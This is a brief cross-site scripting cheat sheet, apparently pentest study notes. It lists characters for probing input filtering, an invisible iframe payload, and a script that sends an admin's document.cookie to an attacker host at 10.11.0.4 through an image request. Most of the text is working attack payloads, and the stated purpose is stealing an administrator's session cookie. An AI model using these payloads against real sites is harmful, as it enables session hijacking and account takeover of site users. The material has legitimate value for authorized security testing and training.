# XSS (Cross Site Scripting)  

## Identifying XSS attacks  

Using these special characters, check to see if any return unfiltered.  

`< > ' " { } ;`  

## iframe  

Embed an invisible iframe, which is used to embed another file in html.  

`<iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe>`  

## Stealing cookie  

Embed the cookie at the end of a image url to steal the cookie of an admin user.  

`<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>`  

